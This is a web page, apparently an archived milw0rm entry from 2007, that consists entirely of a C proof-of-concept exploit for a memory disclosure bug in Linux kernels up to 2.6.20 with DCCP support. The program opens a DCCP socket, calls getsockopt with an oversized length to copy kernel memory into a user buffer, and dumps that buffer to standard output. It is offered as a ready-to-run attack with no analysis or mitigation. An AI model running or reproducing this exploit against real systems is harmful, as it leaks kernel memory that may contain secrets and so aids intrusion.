<html><head><title>Linux Kernel <= 2.6.20 with DCCP Support Memory Disclosure Exploit v2</title></head><pre>#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;net/if.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;linux/net.h&gt;

#define BUFSIZE 0x10000000

int main(int argc, char *argv[])
{
    void *mem = mmap(0, BUFSIZE, PROT_READ | PROT_WRITE,
               MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
    if (mem == (void*)-1) {
       printf(&quot;Alloc failed\n&quot;);
       return -1;
    }
    /* SOCK_DCCP, IPPROTO_DCCP */
    int s = socket(PF_INET, 6, 33);
    if (s == -1) {
       fprintf(stderr, &quot;socket failure!\n&quot;);
       return 1;
    }
   /* SOL_DCCP, DCCP_SOCKOPT_SEND_CSCOV */
    int len = BUFSIZE;
    int x = getsockopt(s, 269, 11, mem, &amp;len);

    if (x == -1)
       perror(&quot;SETSOCKOPT&quot;);
    else
       printf(&quot;SUCCESS\n&quot;);

    write(1, mem, BUFSIZE);

    return 0;
}

// milw0rm.com [2007-03-28]</pre></html>